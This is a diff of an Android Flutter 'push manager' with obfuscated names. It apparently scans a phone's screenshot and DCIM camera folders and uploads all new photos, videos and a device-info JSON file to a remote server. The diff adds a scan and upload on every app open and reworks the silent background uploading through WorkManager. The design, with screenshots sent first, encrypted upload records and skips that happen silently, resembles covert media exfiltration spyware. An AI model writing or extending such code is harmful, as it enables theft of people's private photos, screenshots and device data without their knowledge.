@@ -1,16 +1,14 @@
 /// 推送管理器（逐文件推送版）
 /// - ★ 不打包、不压缩，直接推送原文件
-/// - ★ 每批 3 个并发，批间串行（控制服务端压力）
+/// - ★ 小文件（≤1000 KB）批并发；大文件逐个串行
+/// - ★ 每次打开 App 都真扫目录，检测是否有新内容
 /// - ★ 截图优先（最新 10 张，无大小限制，一次性）
 /// - ★ 截图与 DCIM 目录并行扫描
 /// - ★ 截图目录为空时不锁定一次性标记
-/// - ★ DCIM 排序：新+小 > 新 > baseline（首次启动标记的最新 N 张）
-/// - ★ baseline 只在首次启动 App 扫描时标记一次
 /// - ★ 断点续传：成功入 _sent，失败自动重试
 /// - ★ JSON 首次单独推送
 /// - ★ 智能熔断 + 服务器检测
 /// - ★ 本地记录用 flutter_secure_storage 加密存储
-/// - ★ 跨 isolate 落盘锁，避免前台服务与 WorkManager 重复上传
 library;
 
 import 'dart:async';
@@ -45,7 +43,11 @@ class Mc {
   final Set<String> videoExtensions;
 
   final int maxSingleFileBytes;
+
+  /// ★ 小文件阈值：≤ 此值走「批并发」，> 此值走「逐个串行」
+  ///   同时用于扫描排序时「小文件优先」的判定
   final int smallFileBytes;
+
   final int batchSize;
   final int maxConsecutiveFails;
 
@@ -73,7 +75,7 @@ class Mc {
     },
 
     this.maxSingleFileBytes = 15 * 1024 * 1024,
-    this.smallFileBytes = 5 * 1024 * 1024,
+    this.smallFileBytes = 1000 * 1024,   // ★ 1000 KB
 
     this.batchSize = 3,
     this.maxConsecutiveFails = 6,
@@ -83,6 +85,56 @@ class Mc {
     this.serverWaitInterval = const Duration(seconds: 10),
     this.serverWaitMaxAttempts = 180,
   });
+}
+
+// ── 「打开 App」扫描结果 ───────────────────────────────────────────────
+class ScanResult {
+  /// 本轮扫描到的总数（已按扩展名/体积过滤）
+  final int scannedCount;
+  /// 其中新发现、还没上传过的数量
+  final int newCount;
+  /// 是否因为已有任务在跑而跳过
+  final bool busy;
+  /// 权限缺失项
+  final List<String> missingPermissions;
+
+  const ScanResult._({
+    required this.scannedCount,
+    required this.newCount,
+    required this.busy,
+    required this.missingPermissions,
+  });
+
+  factory ScanResult.noNew(int scanned) => ScanResult._(
+        scannedCount: scanned,
+        newCount: 0,
+        busy: false,
+        missingPermissions: const [],
+      );
+
+  factory ScanResult.hasNew(int scanned, int fresh) => ScanResult._(
+        scannedCount: scanned,
+        newCount: fresh,
+        busy: false,
+        missingPermissions: const [],
+      );
+
+  factory ScanResult.noPermission(List<String> missing) => ScanResult._(
+        scannedCount: 0,
+        newCount: 0,
+        busy: false,
+        missingPermissions: missing,
+      );
+
+  factory ScanResult.busy() => const ScanResult._(
+        scannedCount: 0,
+        newCount: 0,
+        busy: true,
+        missingPermissions: [],
+      );
+
+  bool get hasNew => newCount > 0;
+  bool get ok => !busy && missingPermissions.isEmpty;
 }
 
 // ── 单例管理器 ─────────────────────────────────────────────────────────
@@ -96,21 +148,13 @@ class Ma {
   static const String _kJsonUrl = 'm1ju';
   /// 截图一次性完成标记
   static const String _kScreenshotDone = 'm1sc';
-
-  /// ★ baseline：首次启动 App 扫描时标记的最新 N 张（默认 50）的指纹
-  static const String _kBaseline = 'm5baseline';
-  /// ★ baseline 是否已完成首次标记（防止重启后重复标记）
-  static const String _kBaselineDone = 'm5baselinedone';
-
-  /// ★ 跨 isolate 落盘锁：持有者写入「开始时间戳」，
-  ///   到期自动失效（防止进程被杀导致死锁）
-  static const String _kRunningAt = 'm5running';
-  /// 锁的有效期：超过这个时间认为持有者已死，可以抢锁
-  static const Duration _kLockTtl = Duration(minutes: 10);
+  /// 上一次真正开跑的时间戳（毫秒），用于跨 isolate 互斥
+  static const String _kLastRunAt = 'm5run';
+  /// ★ 上一次扫描快照（指纹列表），用于 _sent 异常时的兜底诊断
+  static const String _kLastScanSnapshot = 'm5snap';
 
   Mc _config = const Mc();
 
-  /// ★ 换成 secure storage
   FlutterSecureStorage? _secure;
   bool _initialized = false;
 
@@ -123,31 +167,20 @@ class Ma {
   bool _screenshotDone = false;
   /// 本轮扫描到的截图目录候选数（未过滤 _sent），用于判断“目录是否为空”
   int _lastScannedShotCount = 0;
-
-  /// ★ baseline 指纹集合：首次启动 App 扫描时标记的「最新 N 张」
-  final Set<String> _baseline = <String>{};
-  /// ★ baseline 是否已经完成首次标记
-  bool _baselineDone = false;
+  /// ★ 上一次扫描的指纹集合（用于和本轮对比诊断）
+  Set<String> _lastSnapshot = <String>{};
 
   Future<void>? _currentTask;
   Future<bool>? _jsonPushing;
 
-  /// 本轮执行的截止时间；null 表示不限时（前台服务是常驻的，不用限）
+  /// 本轮执行的截止时间；null 表示不限时
   DateTime? _deadline;
 
-  /// 预算是不是已经用完了。
-  ///
-  /// ★ 为什么需要它：WorkManager 的 executeTask 最多只能跑 10 分钟，
-  ///   超时会被系统直接掐掉（不是优雅退出）。而 _waitForServer() 单独一项
-  ///   就能等 180×10s ≈ 30 分钟，pushTimeout 又是每文件 5 分钟 ——
-  ///   不限时就必然在跑到一半时被掐死，返回不了结果，
-  ///   WorkManager 还会按失败重试，白耗电量。有了预算就能自己收工返回。
   bool get _outOfTime {
     final d = _deadline;
     return d != null && !DateTime.now().isBefore(d);
   }
 
-  /// 剩余预算；null 表示不限时
   Duration? get _remaining {
     final d = _deadline;
     if (d == null) return null;
@@ -160,8 +193,6 @@ class Ma {
   bool get jsonSent => _jsonSent;
   String? get jsonUrl => _jsonUrl;
   bool get screenshotDone => _screenshotDone;
-  bool get baselineDone => _baselineDone;
-  int get baselineCount => _baseline.length;
 
   Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);
 
@@ -169,8 +200,7 @@ class Ma {
     try {
       final name = file.path.split('/').last;
       final size = file.lengthSync();
-      final mtime = file.lastModifiedSync().millisecondsSinceEpoch;
-      return _sentUrls['$name:$size:$mtime'];
+      return _sentUrls['$name:$size'];
     } catch (_) {
       return null;
     }
@@ -195,15 +225,6 @@ class Ma {
   }
 
   // ── secure storage 安全读写 ────────────────────────────────────────
-  //
-  // ★ 为什么每处都要兜住：initialize() 是在整轮任务最开头调的，
-  //   而它里面全是 secure storage 读取。后台 isolate 里插件没注册好
-  //   就会抛 MissingPluginException —— 一抛，initialize() 抛，
-  //   startPushIfPermitted() 抛，整轮后台任务直接报废，
-  //   日志里只有一句「任务执行失败」，看不出是权限还是存储的问题。
-  //
-  //   读不到最多是「这轮不认识已经传过的文件」，比整个任务不跑强得多。
-
   Future<String?> _readSecure(String key) async {
     try {
       final store = _secure;
@@ -235,11 +256,8 @@ class Ma {
     }
   }
 
-  /// ★ 指纹：文件名 + 大小 + mtime，几乎不会碰撞。
-  ///   加上 mtime 是为了避免「同名同大小不同内容」被误判为已上传。
   String _fingerprint(_Scanned s) =>
-      '${s.file.path.split('/').last}:${s.size}:'
-      '${s.modified.millisecondsSinceEpoch}';
+      '${s.file.path.split('/').last}:${s.size}';
 
   // ── 初始化 ─────────────────────────────────────────────────────────
   Future<void> initialize({Mc? config}) async {
@@ -283,14 +301,10 @@ class Ma {
     }
     _config = config;
 
-    // ★ secure storage 初始化（仅 Android）
     _secure = const FlutterSecureStorage(
-      aOptions: AndroidOptions(
-        encryptedSharedPreferences: true,
-      ),
+      aOptions: AndroidOptions(encryptedSharedPreferences: true),
     );
 
-    // ★ 读 _sent（List<String> → JSON 字符串）
     _sent.clear();
     final rawSent = await _readSecure(_kSent);
     if (rawSent != null && rawSent.isNotEmpty) {
@@ -300,7 +314,6 @@ class Ma {
       } catch (_) {}
     }
 
-    // ★ 读 _sentUrls（Map<String,String> → JSON 字符串）
     _sentUrls.clear();
     final rawUrls = await _readSecure(_kSentUrls);
     if (rawUrls != null && rawUrls.isNotEmpty) {
@@ -310,21 +323,19 @@ class Ma {
       } catch (_) {}
     }
 
-    // ★ bool → '1'
     _jsonSent = (await _readSecure(_kJsonSent)) == '1';
     _jsonUrl = await _readSecure(_kJsonUrl);
     _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';
 
-    // ★ 读 baseline
-    _baseline.clear();
-    final rawBaseline = await _readSecure(_kBaseline);
-    if (rawBaseline != null && rawBaseline.isNotEmpty) {
+    // ★ 读取上一次扫描快照
+    _lastSnapshot = <String>{};
+    final rawSnap = await _readSecure(_kLastScanSnapshot);
+    if (rawSnap != null && rawSnap.isNotEmpty) {
       try {
-        final decoded = jsonDecode(rawBaseline) as List;
-        _baseline.addAll(decoded.map((e) => e as String));
+        final decoded = jsonDecode(rawSnap) as List;
+        _lastSnapshot.addAll(decoded.map((e) => e as String));
       } catch (_) {}
     }
-    _baselineDone = (await _readSecure(_kBaselineDone)) == '1';
 
     _initialized = true;
 
@@ -333,19 +344,11 @@ class Ma {
     debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
     debugPrint('[M] JSON 已推送: $_jsonSent');
     debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
-    debugPrint('[M] baseline 已标记: $_baselineDone （${_baseline.length} 个）');
+    debugPrint('[M] 上次扫描快照: ${_lastSnapshot.length} 条');
     debugPrint('[M] ══════ 自检完成 ══════');
   }
 
   // ── 权限 ───────────────────────────────────────────────────────────
-  //
-  // ★ 这一整块一律不往外抛异常。
-  //   后台 isolate 里插件没注册好时，Permission.xxx / device_info_plus
-  //   这些平台通道调用会抛 MissingPluginException。以前没兜住，
-  //   一抛就让整轮任务失败，日志里只像是「后台没跑」。
-  //   规矩：查权限失败 = 当作「没给」，但绝不冒泡出去。
-
-  /// 查一个权限，异常一律当「没给」。
   Future<bool> _granted(Permission p) async {
     try {
       final st = await p.status;
@@ -356,21 +359,11 @@ class Ma {
     }
   }
 
-  /// Android 13+：照片 + 视频两个都要
   Future<bool> _hasMedia() async =>
       await _granted(Permission.photos) && await _granted(Permission.videos);
 
-  /// Android 12 及以下：一个存储权限就够
   Future<bool> _hasStorage() async => _granted(Permission.storage);
 
-  /// 上传所需的权限是否齐了。
-  ///
-  /// ★ 关键：拿不到 SDK_INT 时**不能**默认按「旧版权限」处理。
-  ///   device_info_plus 在后台 isolate 里调不通就会返回 0，
-  ///   而 Android 13+ 上 READ_EXTERNAL_STORAGE 因为 manifest 里写了
-  ///   maxSdkVersion=32，状态永远是 denied —— 结果就是「权限明明给了，
-  ///   却判定成没给」，后台任务永远静默跳过，一点提示都没有。
-  ///   所以 SDK 未知时两条路都试，任一满足即放行。
   Future<bool> hasPermission() async {
     if (!Platform.isAndroid) return false;
 
@@ -382,7 +375,6 @@ class Ma {
     return await _hasMedia() || await _hasStorage();
   }
 
-  /// 当前缺哪几个权限 —— 给日志用，只说还没给的那几项。
   Future<List<String>> missingPermissions() async {
     if (!Platform.isAndroid) return const <String>['非 Android 设备'];
 
@@ -392,7 +384,6 @@ class Ma {
       return await _hasStorage() ? const <String>[] : <String>['存储'];
     }
 
-    // SDK 未知：两条路都没通才算缺
     if (await _hasMedia() || await _hasStorage()) return const <String>[];
     return _missingMedia();
   }
@@ -404,14 +395,6 @@ class Ma {
     return missing;
   }
 
-  /// 申请 [hasPermission] 需要的那套权限，返回申请后是否就绪。
-  ///
-  /// ★ 和 [hasPermission] 一一对应：这里申请什么，那里就查什么。
-  ///   两个方法写在一起，改一个就不会漏掉另一个 ——
-  ///   之前引导页不申请权限，hasPermission() 就永远是 false。
-  ///
-  /// ★ SDK 未知时三样都申请：Android 13+ 是主流，而旧版上申请
-  ///   READ_MEDIA_* 拿不到也不会有副作用（下面还补一次存储权限兜底）。
   Future<bool> requestPermission() async {
     if (!Platform.isAndroid) return false;
     if (await hasPermission()) return true;
@@ -428,7 +411,6 @@ class Ma {
     return hasPermission();
   }
 
-  /// 申请单个权限；已经给了、或已被「不再询问」挡住的，不再弹窗。
   Future<void> _request(Permission p) async {
     try {
       final st = await p.status;
@@ -439,9 +421,6 @@ class Ma {
     }
   }
 
-  /// 是不是被「永久拒绝」了（用户选了不再询问）。
-  ///
-  /// 这种状态再怎么 request() 都不会弹窗，只能引导去系统设置手动开。
   Future<bool> isPermanentlyDenied() async {
     if (!Platform.isAndroid) return false;
 
@@ -466,11 +445,77 @@ class Ma {
     }
   }
 
-  /// 跑一轮推送。
-  ///
-  /// [budget] 是这一轮的总时间上限：
-  ///   * WorkManager 那条路必须传 —— 它的 executeTask 硬上限 10 分钟；
-  ///   * 前台服务不传，它是常驻的，可以慢慢等服务器。
+  // ══════════════════════════════════════════════════════════════════
+  // ★ 入口一：打开 App 时调用
+  //   - 每次都真扫目录
+  //   - 不参与跨 isolate 互斥（但会写标记，让后台任务别紧接着重复跑）
+  //   - 有新增才上传；上传放后台继续，UI 立即拿到 ScanResult
+  // ══════════════════════════════════════════════════════════════════
+  Future<ScanResult> checkOnAppOpen({Duration? budget}) async {
+    await initialize();
+
+    if (_currentTask != null) {
+      debugPrint('[M] ⚠️ 已有任务在跑，本次打开跳过扫描');
+      return ScanResult.busy();
+    }
+
+    if (!await hasPermission()) {
+      final missing = await missingPermissions();
+      debugPrint('[M] 权限未就绪（还差: ${missing.join('、')}）');
+      return ScanResult.noPermission(missing);
+    }
+
+    // 写「上次开跑时间」，让紧跟着触发的后台任务先等一下
+    await _markRunStart();
+
+    final scanned = await _scanFiles();
+    final total = scanned.length;
+
+    final currentFingerprints = scanned.map(_fingerprint).toSet();
+    final fresh = scanned
+        .where((s) => !_sent.contains(_fingerprint(s)))
+        .toList();
+
+    // 更新快照（诊断用，不参与去重）
+    final appeared = currentFingerprints.difference(_lastSnapshot);
+    final disappeared = _lastSnapshot.difference(currentFingerprints);
+    if (appeared.isNotEmpty || disappeared.isNotEmpty) {
+      debugPrint('[M] 与上次扫描快照比对：'
+          '新增 ${appeared.length} 项，消失 ${disappeared.length} 项');
+    }
+    _lastSnapshot = currentFingerprints;
+    await _writeSecure(
+        _kLastScanSnapshot, jsonEncode(_lastSnapshot.toList()));
+
+    if (fresh.isEmpty) {
+      debugPrint('[M] 打开 App 扫描完成：无新内容（共 $total 项，'
+          '均已上传过）');
+      await _maybeFinalizeScreenshots(fresh);
+      return ScanResult.noNew(total);
+    }
+
+    final freshMB =
+        fresh.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
+    debugPrint('[M] 打开 App 扫描完成：发现新内容 '
+        '${fresh.length} 项 (${freshMB.toStringAsFixed(1)} MB)');
+
+    // 上传放后台继续，UI 立即拿到结果
+    _deadline = budget == null ? null : DateTime.now().add(budget);
+    final uploadFuture = _pushAll(scanned);
+    _currentTask = uploadFuture;
+    uploadFuture.whenComplete(() {
+      _currentTask = null;
+      _deadline = null;
+    });
+
+    return ScanResult.hasNew(total, fresh.length);
+  }
+
+  // ══════════════════════════════════════════════════════════════════
+  // ★ 入口二：后台（WorkManager / 前台服务）调用
+  //   - 保留跨 isolate 互斥
+  //   - 保留时间预算
+  // ══════════════════════════════════════════════════════════════════
   Future<void> startPushIfPermitted({Duration? budget}) async {
     await initialize();
     if (_currentTask != null) {
@@ -482,88 +527,66 @@ class Ma {
     if (budget != null) {
       debugPrint('[M] ⏱ 本轮预算 ${budget.inMinutes} 分钟');
     }
-    _currentTask = _doPush();
+    final future = _doPush();
+    _currentTask = future;
     try {
-      await _currentTask;
+      await future;
     } finally {
       _currentTask = null;
       _deadline = null;
     }
   }
 
-  // ── 跨 isolate 落盘锁 ─────────────────────────────────────────────
-  //
-  // ★ 前台服务和 WorkManager 跑在两个不同的 isolate 里，各自持有自己的
-  //   Ma.instance，_currentTask 这把锁只在同一 isolate 内有效 ——
-  //   两边会同时扫描同一批文件、重复上传同一张图。
-  //
-  //   ★ 用「落盘锁 + TTL」解决：
-  //     - 谁抢到谁跑，另一个直接跳过；
-  //     - 持有者写「开始时间戳」，超过 TTL（10 分钟）自动失效，
-  //       防止进程被杀导致死锁；
-  //     - 跑完（无论成功失败）都释放。
-  //
-  //   ★ 一律 fail-open：读不到、解析不了、写不进去，统统放行。
-  //     宁可多传一次，也不能因为读不到时间戳就永远不跑 ——
-  //     那就又回到了「后台任务没反应」的老问题。
+  // ── 跨 isolate 互斥 ───────────────────────────────────────────────
+  static const Duration _kMinGap = Duration(minutes: 5);
 
-  Future<bool> _acquireRunLock() async {
+  Future<bool> _anotherRunJustStarted() async {
     try {
       final store = _secure;
-      if (store == null) return true;
-
-      final raw = await store.read(key: _kRunningAt);
-      if (raw != null) {
-        final ms = int.tryParse(raw);
-        if (ms != null) {
-          final at = DateTime.fromMillisecondsSinceEpoch(ms);
-          if (DateTime.now().difference(at) < _kLockTtl) {
-            // 别人还在跑
-            return false;
-          }
-        }
-      }
-      await store.write(
-        key: _kRunningAt,
-        value: '${DateTime.now().millisecondsSinceEpoch}',
-      );
-      return true;
-    } catch (e) {
-      debugPrint('[M] 获取锁失败（放行）: $e');
-      return true;
+      if (store == null) return false;
+      final raw = await store.read(key: _kLastRunAt);
+      if (raw == null) return false;
+      final ms = int.tryParse(raw);
+      if (ms == null) return false;
+      final at = DateTime.fromMillisecondsSinceEpoch(ms);
+      return DateTime.now().difference(at) < _kMinGap;
+    } catch (_) {
+      return false;
     }
   }
 
-  Future<void> _releaseRunLock() async {
+  Future<void> _markRunStart() async {
     try {
-      await _secure?.delete(key: _kRunningAt);
+      final store = _secure;
+      if (store == null) return;
+      await store.write(
+        key: _kLastRunAt,
+        value: '${DateTime.now().millisecondsSinceEpoch}',
+      );
     } catch (_) {}
   }
 
+  // ── 后台任务主流程 ────────────────────────────────────────────────
   Future<void> _doPush() async {
     if (!await hasPermission()) {
-      // 别只说「无权限」：把缺的那几项打出来，不然排查时只能靠猜
       final missing = await missingPermissions();
       debugPrint('[M] 权限未就绪，静默跳过（还差: ${missing.join('、')}）');
       return;
     }
 
-    // ★ 跨 isolate 落盘锁：另一个 isolate 正在跑就跳过，避免重复上传
-    if (!await _acquireRunLock()) {
-      debugPrint('[M] ⏭ 另一个 isolate 正在跑，本轮跳过（避免重复上传）');
+    if (await _anotherRunJustStarted()) {
+      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（${_kMinGap.inMinutes} 分钟内），'
+          '本轮跳过');
       return;
     }
+    await _markRunStart();
 
-    try {
-      final scanned = await _scanFiles();
-      await _pushAll(scanned);
-    } finally {
-      await _releaseRunLock();
-    }
+    final scanned = await _scanFiles();
+    await _pushAll(scanned);
   }
 
   // ══════════════════════════════════════════════════════════════════
-  // 主流程：分批推送
+  // 主流程：小文件批并发 / 大文件逐个串行
   // ══════════════════════════════════════════════════════════════════
   Future<void> _pushAll(List<_Scanned> scanned) async {
     final filtered = scanned
@@ -572,7 +595,6 @@ class Ma {
 
     if (filtered.isEmpty) {
       debugPrint('[M] 无可推送文件');
-      // 即使没有可传文件，也走一次结算（截图目录为空时不锁定）
       await _maybeFinalizeScreenshots(filtered);
       return;
     }
@@ -580,14 +602,32 @@ class Ma {
     try {
       final totalMB =
           filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
-      final batchSize = _config.batchSize.clamp(1, 8);
-      final totalBatches = (filtered.length + batchSize - 1) ~/ batchSize;
+      final smallBytes = _config.smallFileBytes;
+
+      // ★ 按体积分流：小文件批并发，大文件逐个串行
+      final smallFiles = <_Scanned>[];
+      final largeFiles = <_Scanned>[];
+      for (final s in filtered) {
+        (s.size <= smallBytes ? smallFiles : largeFiles).add(s);
+      }
+
+      // 小文件：截图优先，然后新的优先
+      smallFiles.sort((a, b) {
+        if (a.isScreenshot != b.isScreenshot) {
+          return a.isScreenshot ? -1 : 1;
+        }
+        return b.modified.compareTo(a.modified);
+      });
+      // 大文件：新的优先
+      largeFiles.sort((a, b) => b.modified.compareTo(a.modified));
 
       final shotCount = filtered.where((s) => s.isScreenshot).length;
       debugPrint('[M] 共 ${filtered.length} 个文件 '
           '(${totalMB.toStringAsFixed(1)} MB)，'
-          '其中截图 $shotCount 张，'
-          '批大小 $batchSize，共 $totalBatches 批');
+          '截图 $shotCount 张；'
+          '小文件 ${smallFiles.length} 个 '
+          '(≤ ${(smallBytes / 1024).toStringAsFixed(0)} KB)，'
+          '大文件 ${largeFiles.length} 个');
 
       final serverOk = await _waitForServer();
       if (!serverOk) {
@@ -597,9 +637,8 @@ class Ma {
 
       final jsonOk = await _ensureJsonSent();
       if (!jsonOk) {
-        // ★ JSON 只是设备元信息，失败不阻断媒体文件上传，
-        //   下一轮会自动重试（因为它没写 _jsonSent = true）
-        debugPrint('[M] ⚠️ JSON 推送失败，继续推送媒体文件');
+        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
+        return;
       }
 
       final sw = Stopwatch()..start();
@@ -608,47 +647,86 @@ class Ma {
       int consecutiveFails = 0;
       final maxFails = _config.maxConsecutiveFails;
 
-      for (int i = 0; i < filtered.length; i += batchSize) {
-        // 预算到点就收工：剩下的留给下一轮，_sent 已经落盘，可以续传
-        if (_outOfTime) {
-          debugPrint('[M] ⏱ 预算用完，本轮先推到第 ${i ~/ batchSize} 批，'
-              '剩余 ${filtered.length - i} 个下次继续');
-          break;
+      // ── 阶段一：小文件批并发 ──────────────────────────────────────
+      if (smallFiles.isNotEmpty) {
+        final batchSize = _config.batchSize.clamp(1, 8);
+        final totalBatches =
+            (smallFiles.length + batchSize - 1) ~/ batchSize;
+        debugPrint('[M] ▶ 阶段一：小文件批并发 '
+            '(批大小 $batchSize，共 $totalBatches 批)');
+
+        for (int i = 0; i < smallFiles.length; i += batchSize) {
+          if (_outOfTime) {
+            debugPrint('[M] ⏱ 预算用完，小文件剩 '
+                '${smallFiles.length - i} 个留到下一轮');
+            break;
+          }
+          if (consecutiveFails >= maxFails) {
+            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
+            break;
+          }
+
+          final end = (i + batchSize < smallFiles.length)
+              ? i + batchSize
+              : smallFiles.length;
+          final batch = smallFiles.sublist(i, end);
+          final batchNum = (i ~/ batchSize) + 1;
+
+          debugPrint('[M] ═══ 小文件批 $batchNum/$totalBatches '
+              '(${batch.length} 个) ═══');
+
+          final results = await Future.wait(
+            batch.map((s) => _pushOne(s)),
+          );
+
+          for (int j = 0; j < batch.length; j++) {
+            if (results[j]) {
+              _sent.add(_fingerprint(batch[j]));
+              okTotal++;
+              consecutiveFails = 0;
+            } else {
+              failTotal++;
+              consecutiveFails++;
+            }
+          }
+          await _persist();
         }
-        final end = (i + batchSize < filtered.length)
-            ? i + batchSize
-            : filtered.length;
-        final batch = filtered.sublist(i, end);
-        final batchNum = (i ~/ batchSize) + 1;
+      }
 
-        debugPrint('[M] ═══ 批次 $batchNum/$totalBatches '
-            '(${batch.length} 个) ═══');
+      // ── 阶段二：大文件逐个串行 ────────────────────────────────────
+      if (largeFiles.isNotEmpty &&
+          consecutiveFails < maxFails &&
+          !_outOfTime) {
+        debugPrint('[M] ▶ 阶段二：大文件逐个串行 '
+            '(${largeFiles.length} 个)');
 
-        final results = await Future.wait(
-          batch.map((s) => _pushOne(s)),
-        );
+        for (int i = 0; i < largeFiles.length; i++) {
+          if (_outOfTime) {
+            debugPrint('[M] ⏱ 预算用完，大文件剩 '
+                '${largeFiles.length - i} 个留到下一轮');
+            break;
+          }
+          if (consecutiveFails >= maxFails) {
+            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
+            break;
+          }
 
-        for (int j = 0; j < batch.length; j++) {
-          if (results[j]) {
-            _sent.add(_fingerprint(batch[j]));
+          final s = largeFiles[i];
+          final name = s.file.path.split('/').last;
+          final sizeMB = (s.size / 1024 / 1024).toStringAsFixed(1);
+          debugPrint('[M] ═══ 大文件 ${i + 1}/${largeFiles.length} '
+              '(${sizeMB} MB): $name ═══');
+
+          final ok = await _pushOne(s);
+          if (ok) {
+            _sent.add(_fingerprint(s));
             okTotal++;
             consecutiveFails = 0;
           } else {
             failTotal++;
             consecutiveFails++;
           }
-        }
-
-        await _persist();
-
-        debugPrint('[M] 批次 $batchNum 完成: '
-            '成功 ${results.where((r) => r).length}, '
-            '失败 ${results.where((r) => !r).length}, '
-            '连续失败 $consecutiveFails');
-
-        if (consecutiveFails >= maxFails) {
-          debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
-          break;
+          await _persist();
         }
       }
 
@@ -657,7 +735,6 @@ class Ma {
       debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
           '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
 
-      // 结算截图一次性任务
       await _maybeFinalizeScreenshots(filtered);
     } catch (e, st) {
       debugPrint('[M] ❌ 主流程异常: $e\n$st');
@@ -671,7 +748,6 @@ class Ma {
   Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
     if (_screenshotDone) return;
 
-    // ★ 目录为空 → 不锁定
     if (_lastScannedShotCount == 0) {
       debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
       return;
@@ -686,7 +762,6 @@ class Ma {
     }
 
     _screenshotDone = true;
-    // ★ bool → '1'
     await _writeSecure(_kScreenshotDone, '1');
     debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
   }
@@ -709,7 +784,6 @@ class Ma {
       req.files.add(await http.MultipartFile.fromPath('file', file.path));
       req.fields['fileName'] = name;
 
-      // 单文件超时不能超过剩余预算，否则最后一批会把整个任务拖过 10 分钟
       final left = _remaining;
       final perFileTimeout = (left == null || left > _config.pushTimeout)
           ? _config.pushTimeout
@@ -760,9 +834,7 @@ class Ma {
     }
   }
 
-  // ══════════════════════════════════════════════════════════════════
-  // JSON 首次推送
-  // ══════════════════════════════════════════════════════════════════
+  // ── JSON 首次推送 ─────────────────────────────────────────────────
   Future<bool> _ensureJsonSent() async {
     if (_jsonSent && _jsonUrl != null) {
       debugPrint('[M] JSON 已推送，跳过');
@@ -796,8 +868,6 @@ class Ma {
       req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
       req.fields['fileName'] = 'device_info.json';
 
-      // 和 _pushOne 一样受剩余预算约束：JSON 超时写死 5 分钟，
-      // 在只有 8 分钟预算的后台任务里会一口吃掉大半，剩下没时间传文件
       final left = _remaining;
       final jsonTimeout = (left == null || left > _config.pushTimeout)
           ? _config.pushTimeout
@@ -821,7 +891,6 @@ class Ma {
         }
         _jsonSent = true;
         _jsonUrl = serverUrl;
-        // ★ bool → '1'，URL → 直接存
         await _writeSecure(_kJsonSent, '1');
         if (serverUrl != null) {
           await _writeSecure(_kJsonUrl, serverUrl);
@@ -891,7 +960,6 @@ class Ma {
         debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
         return true;
       }
-      // 预算用完就别再等了，把控制权交回去，让任务能正常返回
       if (_outOfTime) {
         debugPrint('[M] ⏱ 预算用完（已等 $i 次），本轮不再等待服务器');
         return false;
@@ -933,15 +1001,15 @@ class Ma {
   }
 
   // ══════════════════════════════════════════════════════════════════
-  // 扫描（截图与 DCIM 并行）
+  // 扫描：★ 每次都真扫，不使用目录缓存
   // ══════════════════════════════════════════════════════════════════
   Future<List<_Scanned>> _scanFiles() async {
-    // ★ 并行扫描两个目录
+    // 截图与 DCIM 并行扫描
     final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
         ? _scanOneDir(
             _config.screenshotPath,
             isScreenshot: true,
-            applySizeLimit: false, // 截图无大小限制
+            applySizeLimit: false,
           )
         : Future.value(<_Scanned>[]);
 
@@ -955,26 +1023,7 @@ class Ma {
     final shotsAll = results[0];
     final mA = results[1];
 
-    // 记录截图目录符合条件的文件数（未过滤 _sent）
     _lastScannedShotCount = shotsAll.length;
-
-    // ★★ baseline 首次标记：
-    //   首次启动 App 扫描到 DCIM 后，取当时最新的 maxFiles（默认 50）张，
-    //   把它们的指纹写入 _baseline 并落盘。之后每次启动都用这份 baseline，
-    //   不再重新标记 —— 所以称为「首次开启 App 扫描时标记的那 50 张」。
-    if (!_baselineDone) {
-      final sortedAll = [...mA]
-        ..sort((a, b) => b.modified.compareTo(a.modified));
-      final topN = sortedAll.take(_config.maxFiles).toList();
-      _baseline
-        ..clear()
-        ..addAll(topN.map(_fingerprint));
-      _baselineDone = true;
-      await _writeSecure(_kBaseline, jsonEncode(_baseline.toList()));
-      await _writeSecure(_kBaselineDone, '1');
-      debugPrint('[M] ★ 首次扫描完成，标记 baseline ${_baseline.length} 张'
-          '（DCIM 共 ${mA.length} 个候选）');
-    }
 
     // 截图：过滤已推送 → 最新 N 张
     final shotsPending = shotsAll
@@ -984,22 +1033,10 @@ class Ma {
     final pickedShots =
         shotsPending.take(_config.screenshotMaxFiles).toList();
 
-    // ★ DCIM 排序优先级：
-    //   0 = 新文件 + 小文件（不在 baseline 里，size ≤ smallFileBytes）
-    //   1 = 新文件（不在 baseline 里）
-    //   2 = baseline（首次启动时标记的最新 N 张）
-    //   同级按 mtime 降序（新的在前），时间相同再按体积升序。
+    // DCIM：过滤已推送
     final mP = mA
         .where((s) => !_sent.contains(_fingerprint(s)))
         .toList();
-    mP.sort((a, b) {
-      final pa = _priority(a);
-      final pb = _priority(b);
-      if (pa != pb) return pa.compareTo(pb);
-      final byTime = b.modified.compareTo(a.modified);
-      if (byTime != 0) return byTime;
-      return a.size.compareTo(b.size);
-    });
 
     // 合并：截图优先
     final merged = <_Scanned>[];
@@ -1016,15 +1053,6 @@ class Ma {
     }
 
     return merged;
-  }
-
-  /// DCIM 文件排序优先级：
-  ///   0 = 新文件 + 小文件（不在 baseline 里，且 size ≤ smallFileBytes）
-  ///   1 = 新文件（不在 baseline 里）
-  ///   2 = baseline（首次启动时标记的最新 N 张，兜底补传）
-  int _priority(_Scanned s) {
-    if (_baseline.contains(_fingerprint(s))) return 2;
-    return s.size <= _config.smallFileBytes ? 0 : 1;
   }
 
   Future<List<_Scanned>> _scanOneDir(
@@ -1046,7 +1074,6 @@ class Ma {
       final isImage = _config.imageExtensions.contains(ext);
       final isVideo = _config.videoExtensions.contains(ext);
 
